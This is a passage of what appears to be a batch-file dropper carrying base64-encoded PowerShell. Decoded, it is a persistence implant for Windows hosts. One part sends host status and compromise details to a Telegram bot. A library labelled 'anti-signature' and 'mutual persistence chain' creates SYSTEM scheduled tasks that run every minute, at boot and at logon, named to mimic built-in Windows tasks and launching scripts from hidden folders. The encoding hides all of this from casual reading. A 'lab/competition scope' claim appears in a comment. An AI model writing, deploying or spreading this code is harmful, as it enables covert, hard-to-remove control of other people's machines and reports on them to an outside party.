aCAvIDFLQikgfSBlbHNlIHsgJzAnIH0KICAgICRwcmltU2hvcnQgPSBpZiAoJHByaW1PaykgeyAn
T0snIH0gZWxzZSB7ICdET1dOJyB9CiAgICAkYWx0U2hvcnQgPSBpZiAoJGFsdExpbmUgLWxpa2Ug
J1J1bm5pbmcqJykgeyAnT0snIH0gZWxzZSB7ICctJyB9CiAgICAkdGV4dCA9ICIkZW1vamkgU0NE
fCQoJGVudjpDT01QVVRFUk5BTUUpfHByaW09JHByaW1TaG9ydHxhbHQ9JGFsdFNob3J0fGZvcmVp
Z249JGZvcmVpZ25OfHRhc2tzPSR0YXNrT2svNXxtc2k9JG1zaVNob3J0fHVwPSR1cHRpbWV8Yj0k
QnVpbGR8JG5vdyIKfQoKaWYgKCR0ZXh0Lkxlbmd0aCAtZ3QgMzgwMCkgewogICAgJHJtbUhpdHMg
PSBAKCgkcm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0gLi4uICh7MH0g
bW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkKICAgICRzY0xpc3QgPSBAKCgkc2NMaXN0
IHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTQpKSArICgnLSAuLi4gKHswfSBtb3JlKScgLWYgKCRz
Y0xpc3QuQ291bnQgLSAxNCkpCiAgICAkdGV4dCA9ICR0ZXh0LlN1YnN0cmluZygwLCAzODAwKSAr
ICJgbmBuPGk+VFJVTkNBVEVEIChUZWxlZ3JhbSA0MDk2IGxpbWl0KTwvaT4iCn0KCiRsb2cgPSBK
b2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJwpmdW5jdGlvbiBTZW5kLVRnKFtzdHJpbmddJG1z
ZywgW3N0cmluZ10kbW9kZSkgewogICAgJHBheWxvYWQgPSBAewogICAgICAgIGNoYXRfaWQgICAg
ICAgICAgICAgICAgICA9ICRjZmcuQ0hBVF9JRAogICAgICAgIHRleHQgICAgICAgICAgICAgICAg
ICAgICA9ICRtc2cKICAgICAgICBkaXNhYmxlX3dlYl9wYWdlX3ByZXZpZXcgPSAkdHJ1ZQogICAg
fQogICAgaWYgKCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUgPSAkbW9kZSB9CiAgICAkanNv
biA9ICRwYXlsb2FkIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIC1EZXB0aCA1CiAgICAkYnl0
ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRqc29uKQogICAgSW52
b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRjZmcu
Qk9UX1RPS0VOKS9zZW5kTWVzc2FnZSIpIGAKICAgICAgICAtTWV0aG9kIFBvc3QgLUJvZHkgJGJ5
dGVzIC1Db250ZW50VHlwZSAnYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCcgfCBPdXQt
TnVsbAp9CgpmdW5jdGlvbiBTZW5kLVRnU2FmZShbc3RyaW5nXSRtc2csIFtzdHJpbmddJG1vZGUp
IHsKICAgICR0b1NlbmQgPSAkbXNnCiAgICB0cnkgewogICAgICAgIFNlbmQtVGcgLW1zZyAkdG9T
ZW5kIC1tb2RlICRtb2RlCiAgICAgICAgcmV0dXJuICR0cnVlCiAgICB9IGNhdGNoIHsKICAgICAg
ICB0cnkgewogICAgICAgICAgICBTZW5kLVRnIC1tc2cgKCR0b1NlbmQuU3Vic3RyaW5nKDAsIDMw
MDApICsgImBuPGk+VFJVTkNBVEVEPC9pPiIpIC1tb2RlICRtb2RlCiAgICAgICAgICAgIHJldHVy
biAkdHJ1ZQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICByZXR1cm4gJGZhbHNlCiAgICAg
ICAgfQogICAgfQp9Cgp0cnkgewogICAgaWYgKFNlbmQtVGdTYWZlIC1tc2cgJHRleHQgLW1vZGUg
J0hUTUwnKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0
Z19zZW50X3JpY2gnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICB9IGVsc2Ugewog
ICAgICAgIHRocm93ICdodG1sX2ZhaWxlZCcKICAgIH0KICAgIGlmICgka2V5IC1lcSAnREVQTE9Z
JykgewogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAoInRnX2Rl
cGxveV9vaz0iICsgJGRlcGxveU9rKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAg
ICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lf
dGcuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0gY2F0Y2ggewogICAgdHJ5IHsKICAgICAgICAkcGxhaW4gPSBb
cmVnZXhdOjpSZXBsYWNlKCR0ZXh0LCAnPFtePl0rPicsICcnKQogICAgICAgICRwbGFpbiA9IFtT
eXN0ZW0uTmV0LldlYlV0aWxpdHldOjpIdG1sRGVjb2RlKCRwbGFpbikKICAgICAgICBpZiAoJHBs
YWluLkxlbmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1MDAp
ICsgImBuVFJVTkNBVEVEIiB9CiAgICAgICAgU2VuZC1UZ1NhZmUgLW1zZyAkcGxhaW4gLW1vZGUg
JycgfCBPdXQtTnVsbAogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1
ZSAndGdfc2VudF9wbGFpbicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0gY2F0
Y2ggewogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAoInRnX2Zh
aWwgIiArICRfLkV4Y2VwdGlvbi5NZXNzYWdlKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgfQp9Cg==
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDEzCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTM6IHNjaHRhc2tzIENy
ZWF0ZSB2aWEgY21kIChsaWtlIFd1Y2FjaGVPd24pLCBUUiB1bmRlciBXaW5kb3dzXFRlbXBcLnd1
Y2FjaGUKIyAgICAgIChub3QgQUNMLWxvY2tlZCBQcm9ncmFtRGF0YSBwYXRoKSwgL1NUIDAwOjAw
IG9uIE1JTlVURSwgbm8gbGVhZGluZyBcLgojIEwxMjogSURFTlRWRVI9NyBST09ULWxldmVsIHRh
c2sgbmFtZXMgKG5lc3RlZCBNaWNyb3NvZnRcV2luZG93cyBBY2Nlc3MgRGVuaWVkKS4KIyBMMTE6
IE5FVkVSIHJldXNlIHJlYWwgV2luZG93cyBidWlsdC1pbiB0YXNrIG5hbWVzOyBUUiBvd25lcnNo
aXAgY2hlY2tzLgojIEF1dGhvcml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRp
dGlvbiBzY29wZSBvbmx5LgojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkApbQ21kbGV0QmluZGluZygpXQpw
YXJhbSgKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgW1ZhbGlkYXRlU2V0
KCdpbml0JywgJ3dhdGNoZG9nJywgJ3dhdGNoZG9nLWVuc3VyZScsICd0YXNrcy1lbnN1cmUnLCAn
c3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywgJ3JlZ2lzdGVyZWQnLCAnZXh0ZXJtaW5hdGUn
KV0KICAgIFtzdHJpbmddJEFjdGlvbiwKICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3Jh
bURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10k
TW9uUGF0aCA9ICcnLAogICAgW3N0cmluZ10kQnVpbGQgID0gJ08xNScsCiAgICBbc3RyaW5nXSRF
eHRyYSAgPSAnJywKICAgIFtzdHJpbmddJEZwICAgICA9ICcnCikKCiRFcnJvckFjdGlvblByZWZl
cmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKJGNmZ1BhdGggPSBKb2luLVBhdGggJFdvcmtEaXIg
J2lkZW50aXR5LmNmZycKJElkZW50VmVyc2lvbiA9IDgKCiMgUm9vdC1sZXZlbCBuYW1lcyBXSVRI
T1VUIGxlYWRpbmcgYmFja3NsYXNoIChtYXRjaGVzIHdvcmtpbmcgV3VjYWNoZU93biBzdHlsZSku
CiRQb29scyA9IEB7CiAgICBBID0gQCgnV2VyUXVldWVTeW5jJywnRGlhZ0hvc3RDYWNoZScsJ05l
dFRyYWNlQ2FjaGUnLCdXZGlIb3N0UHJveHknLCdQbGFTZXJ2ZXJIZWFsdGgnLCdUY3BJcENvbmZs
aWN0UmVzJywnU3JDYWNoZVN5bmMnLCdSZXNvbHV0aW9uUXVldWUnKQogICAgQiA9IEAoJ1BsYVNl
cnZlckhlYWx0aCcsJ1dkaUhvc3RQcm94eScsJ1dlclF1ZXVlU3luYycsJ05ldFRyYWNlQ2FjaGUn
LCdEaWFnSG9zdENhY2hlJywnVGNwSXBDb25mbGljdFJlcycsJ1BsYVNlcnZlckRpYWcnLCdTckNh
Y2hlU3luYycpCiAgICBDID0gQCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1Rj
cElwQ29uZmxpY3RSZXMnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9z
dENhY2hlJywnUGxhU2VydmVyRGlhZycsJ1dkaUhvc3RQcm94eScpCiAgICBEID0gQCgnVGNwSXBD
b25mbGljdFJlcycsJ1Jlc29sdXRpb25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdEaWFnSG9zdENh
Y2hlJywnUGxhU2VydmVyRGlhZycsJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhlYWx0aCcsJ1dk
aUhvc3RQcm94eScpCn0KJERlZmF1bHRzID0gW29yZGVyZWRdQHsKICAgIFRBU0tfQSA9ICdXZXJR
dWV1ZVN5bmMnCiAgICBUQVNLX0IgPSAnUGxhU2VydmVySGVhbHRoJwogICAgVEFTS19DID0gJ1dk
aUhvc3RQcm94eScKICAgIFRBU0tfRCA9ICdUY3BJcENvbmZsaWN0UmVzJwogICAgTU9fQSAgID0g
JzInCiAgICBNT19CICAgPSAnMycKfQoKZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsKICAgICRzID0g
MEwKICAgIGZvcmVhY2ggKCRjIGluICRlbnY6Q09NUFVURVJOQU1FLlRvVXBwZXIoKS5Ub0NoYXJB
cnJheSgpKSB7ICRzID0gKCRzICogMzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcgfQogICAgcmV0
dXJuICRzCn0KCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgewogICAgJGlkID0gJERlZmF1bHRzLkNs
b25lKCkKICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICBmb3JlYWNoICgkbGlu
ZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsKICAgICAg
ICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7
ICRpZFskbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9CiAgICAgICAgfQogICAgfQogICAgcmV0
dXJuICRpZAp9CgpmdW5jdGlvbiBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7CiAgICBp
ZiAoJHRuKSB7ICYgc2NodGFza3MuZXhlIC9EZWxldGUgL1ROICR0biAvRiAyPiYxIHwgT3V0LU51
bGwgfQp9CgpmdW5jdGlvbiBHZXQtVGFza1ZlcmJvc2VCbG9iKFtzdHJpbmddJHRuKSB7CiAgICBp
ZiAoLW5vdCAkdG4pIHsgcmV0dXJuICcnIH0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVl
cnkgL1ROICR0biAvRk8gTElTVCAvViAyPiRudWxsCiAgICBpZiAoJExBU1RFWElUQ09ERSAtbmUg
MCAtb3IgLW5vdCAkb3V0KSB7IHJldHVybiAnJyB9CiAgICByZXR1cm4gKCgkb3V0IHwgRm9yRWFj
aC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIpCn0KCmZ1bmN0aW9uIFRlc3QtVGFza093bnNN
b24oW3N0cmluZ10kdG4sIFtzdHJpbmddJG1hcmtlcikgewogICAgIyBUcnVlIG9ubHkgaWYgdGhl
IHNjaGVkdWxlZCBhY3Rpb24gcG9pbnRzIGF0IE9VUiBtb24vZXRsIHBhdGgg4oCUIG5vdCBhIFdp
bmRvd3MgQ09NIGhhbmRsZXIuCiAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAg
ICBpZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZhbHNlIH0KICAgIGlmICgkbWFya2VyIC1hbmQg
KCRibG9iIC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJG1hcmtlcikpKSB7IHJldHVybiAkdHJ1ZSB9
CiAgICBpZiAoJGJsb2IgLW1hdGNoICcoP2kpXC53dWNhY2hlXFx8b3duX21vblwuY21kfGV0bF9t
b25cLmNtZHxcLmV0bGNhY2hlXFwnKSB7IHJldHVybiAkdHJ1ZSB9CiAgICByZXR1cm4gJGZhbHNl
Cn0KCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgewogICAgIyBJZGVtcG90ZW50IHdpdGhp
biBhbiBJREVOVFZFUiBnZW5lcmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6CiAg
ICAjIG93bmVkIG9sZC1uYW1lIHRhc2tzIGFyZSBkZWxldGVkOyBXaW5kb3dzIGJ1aWx0LWlucyB3
aXRoIHNhbWUgbmFtZSBhcmUgbGVmdCBhbG9uZS4KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgp
IHsKICAgICAgICAkb2xkID0gUmVhZC1JZGVudGl0eQogICAgICAgICMgTDc6IGFsc28gcmVnZW5l
cmF0ZSBpZiBhbnkgVEFTS18qIGlzIGVtcHR5IChMNC1MNiBtb2R1bG8vY2FzdCBidWdzIGxlZnQg
Ymxhbmsgc2xvdHMpCiAgICAgICAgJHNsb3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJ
ZGVudFZlcnNpb24iKSAtYW5kICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFu
ZCAkb2xkWydUQVNLX0MnXSAtYW5kICRvbGRbJ1RBU0tfRCddCiAgICAgICAgaWYgKCRzbG90c09r
KSB7IHJldHVybiAkb2xkIH0KICAgICAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19C
JywnVEFTS19DJywnVEFTS19EJykgewogICAgICAgICAgICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtd
CiAgICAgICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgICAgICMgTmV2
ZXIgZGVsZXRlIGEgcmVhbCBXaW5kb3dzIHRhc2sgd2UgbmV2ZXIgb3duZWQgKFRSIGlzIENPTS9j
dXN0b20gaGFuZGxlcikuCiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAnJykg
eyBSZW1vdmUtVGFza1F1aWV0ICR0biB9CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1JdGVtIC1M
aXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UKICAgIH0KICAgICRzID0gR2V0LUhvc3RTZWVkCiAg
ICAjIEw0OiB0d28gc2xvdHMgbWF5IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBz
aGFyZSBuYW1lcykgLT4KICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdv
IHNsb3RzIGFuZCB0aGUgZmxlZXQgc2hvd3MgMy80LgogICAgIyBXYWxrIGVhY2ggcG9vbCBmb3J3
YXJkIHVudGlsIHRoZSBwaWNrIGlzIHVuaXF1ZSBhY3Jvc3Mgc2xvdHMuCiAgICAjIEw2OiB0aGUg
b2xkIEAoQCgnQScsICRzICUgOCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tlbiBpbiBQUyA1
LjE6CiAgICAjIGJhcmUgJSBpbnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3Qg
YWxpYXMgKG5vdCBtb2R1bG8pLCBzbyB0aGUKICAgICMgY29sbGVjdGlvbiBjb2xsYXBzZWQgYW5k
IHRoZSBsb29wIG5ldmVyIHJhbiAtPiBpZGVudGl0eS5jZmcgaGFkIEVNUFRZCiAgICAjIFRBU0tf
KiBhbmQgdGhlIHdob2xlIGZsZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVmYXVsdCB0YXNr
IG5hbWVzLgogICAgJHNlZWRzID0gW29yZGVyZWRdQHsKICAgICAgICBBID0gKCRzICUgOCkKICAg
ICAgICBCID0gKCgkcyArIDMpICUgOCkKICAgICAgICBDID0gKCgkcyArIDUpICUgOCkKICAgICAg
ICBEID0gKCgkcyArIDcpICUgOCkKICAgIH0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9CiAgICBm
b3JlYWNoICgkbGV0dGVyIGluICdBJywnQicsJ0MnLCdEJykgewogICAgICAgICRpID0gW2ludF0k
c2VlZHNbJGxldHRlcl0KICAgICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV0KICAgICAg
ICAkbiA9IDAKICAgICAgICB3aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5k
ICRuIC1sdCA4KSB7ICRpID0gKCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVsk
aV07ICRuKysgfQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJU
QVNLXyRsZXR0ZXIiXSB9CiAgICAgICAgJHBpY2tbJGxldHRlcl0gPSAkbmFtZQogICAgfQogICAg
JGNmZyA9IEAoCiAgICAgICAgIlRBU0tfQT0kKCRwaWNrLkEpIgogICAgICAgICJUQVNLX0I9JCgk
cGljay5CKSIKICAgICAgICAiVEFTS19DPSQoJHBpY2suQykiCiAgICAgICAgIlRBU0tfRD0kKCRw
aWNrLkQpIgogICAgICAgICJNT19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWlu
IGppdHRlcgogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWlu
IGppdHRlcgogICAgICAgICJTRUVEPSRzIgogICAgICAgICJJREVOVFZFUj0kSWRlbnRWZXJzaW9u
IgogICAgKQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1WYWx1ZSAkY2Zn
IC1Gb3JjZQogICAgcmV0dXJuIChSZWFkLUlkZW50aXR5KQp9CgpmdW5jdGlvbiBOb3JtYWxpemUt
VGFza05hbWUoW3N0cmluZ10kdG4pIHsKICAgIGlmICgtbm90ICR0bikgeyByZXR1cm4gJycgfQog
ICAgcmV0dXJuICR0bi5UcmltKCkuVHJpbVN0YXJ0KCdcJykKfQoKZnVuY3Rpb24gV3JpdGUtT3du
TG9nKFtzdHJpbmddJG0pIHsKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJy
JwogICAgdHJ5IHsgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3Jj
ZSB9IGNhdGNoIHt9Cn0KCmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3MgewogICAgIyBNaXJy
b3Igd29ya2luZyBkZXRhY2ggKFd1Y2FjaGVPd24pOiBjbWQgc2NodGFza3MsIEJPT1QgVFIgcGF0
aCwgL1NUIG9uIE1JTlVURS4KICAgICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHkKICAgIGlmICgt
bm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNt
ZCcgfQogICAgJGJvb3QgPSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdUZW1wXC53dWNhY2hl
JwogICAgJGV0bERpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRl
XC5ldGxjYWNoZScKICAgIGZvcmVhY2ggKCRkIGluIEAoJGJvb3QsICRldGxEaXIpKSB7CiAgICAg
ICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IE5ldy1JdGVtIC1JdGVt
VHlwZSBEaXJlY3RvcnkgLVBhdGggJGQgLUZvcmNlIHwgT3V0LU51bGwgfQogICAgfQogICAgJGJv
b3RNb24gPSBKb2luLVBhdGggJGJvb3QgJ293bl9tb24uY21kJwogICAgJGJvb3RFdGwgPSBKb2lu
LVBhdGggJGJvb3QgJ2V0bF9tb24uY21kJwogICAgJGV0bE1vbiA9IEpvaW4tUGF0aCAkZXRsRGly
ICdldGxfbW9uLmNtZCcKICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNb25QYXRoKSB7
CiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJv
b3RNb24gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1J
dGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RFdGwgLUZvcmNlIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0
aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIH0KICAgICMgQk9PVCBpcyBub3QgTG9ja0RpcidkIGJ5IG93bl9zZWN1
cmUg4oCUIFRhc2sgU2NoZWR1bGVyIGNhbiByZXNvbHZlIFRSIHRoZXJlLgogICAgJHRyTW9uID0g
ImNtZC5leGUgL2MgJGJvb3RNb24iCiAgICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAkYm9vdEV0bCIK
ICAgICRtb0EgPSBbc3RyaW5nXSRpZFsnTU9fQSddOyBpZiAoLW5vdCAkbW9BKSB7ICRtb0EgPSAn
MicgfQogICAgJG1vQiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1v
QiA9ICczJyB9CiAgICAkc3QgPSAoR2V0LURhdGUpLlRvU3RyaW5nKCdISDptbScpCiAgICAkc3Bl
Y3MgPSBAKAogICAgICAgIEB7IEtleSA9ICdUQVNLX0EnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQn
OyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7IFRyID0gJHRyTW9uIH0KICAgICAgICBAeyBLZXkg
PSAnVEFTS19CJzsgTWFya2VyID0gJ2V0bF9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAk
bW9COyBUciA9ICR0ckV0bCB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQyc7IE1hcmtlciA9ICdv
d25fbW9uLmNtZCc7IFNjID0gJ09OU1RBUlQnOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICAg
ICAgQHsgS2V5ID0gJ1RBU0tfRCc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OTE9H
T04nOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICApCiAgICAkb2sgPSAwOyAkcmVhcm1lZCA9
IDA7ICRmYWlsID0gMAogICAgZm9yZWFjaCAoJHNwIGluICRzcGVjcykgewogICAgICAgICR0biA9
IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJHNwLktleV0pCiAgICAgICAgaWYgKC1u
b3QgJHRuKSB7ICRmYWlsKys7IGNvbnRpbnVlIH0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01v
biAkdG4gJHNwLk1hcmtlcikgeyAkb2srKzsgY29udGludWUgfQogICAgICAgIGlmIChUZXN0LVRh
c2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0KICAgICAg
ICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAgICAgICAgaWYgKC1ub3QgJGJsb2Ip
IHsgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICgiXCR0biIpIH0KICAgICAgICBpZiAoJGJs
b2IpIHsKICAgICAgICAgICAgJG91cnNCcm9rZW4gPSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21v
blwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAgICAgICAg
ICBpZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25Mb2cgInRhc2tzX3Nr
aXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9CiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQg
JHRuCiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQgKCJcJHRuIikKICAgICAgICB9CiAgICAg
ICAgIyBCdWlsZCBjbWRsaW5lIGV4YWN0bHkgbGlrZSBvd24uY21kIGRldGFjaCAocHJvdmVuIHRv
IHdvcmsgYXMgU1lTVEVNKS4KICAgICAgICAkcGFydHMgPSBAKAogICAgICAgICAgICAnL0NyZWF0
ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdISUdIRVNUJywgJy9GJywK
ICAgICAgICAgICAgJy9UUicsICRzcC5UciwgJy9TQycsICRzcC5TYwogICAgICAgICkKICAgICAg
ICBpZiAoJHNwLlNjIC1lcSAnTUlOVVRFJykgewogICAgICAgICAgICAkcGFydHMgKz0gQCgnL01P
JywgJHNwLk1vLCAnL1NUJywgJHN0KQogICAgICAgIH0KICAgICAgICAkYXJnTGluZSA9ICgkcGFy
dHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ1tccyJdJykg
eyAnInswfSInIC1mICgkXyAtcmVwbGFjZSAnIicsICdcIicpIH0gZWxzZSB7ICRfIH0KICAgICAg
ICB9KSAtam9pbiAnICcKICAgICAgICAkY3JlYXRlVHh0ID0gY21kLmV4ZSAvYyAic2NodGFza3Mu
ZXhlICRhcmdMaW5lIiAyPiYxIHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0KICAgICAgICAkY3Jl
YXRlSm9pbmVkID0gKCRjcmVhdGVUeHQgLWpvaW4gJyAnKS5UcmltKCkKICAgICAgICBXcml0ZS1P
d25Mb2cgInRhc2tzX2NyZWF0ZSAkKCRzcC5LZXkpICR0biA9PiAkY3JlYXRlSm9pbmVkIgogICAg
ICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgLW9yIChUZXN0LVRhc2tP
d25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpKSB7CiAgICAgICAgICAgICRyZWFybWVkKysKICAg
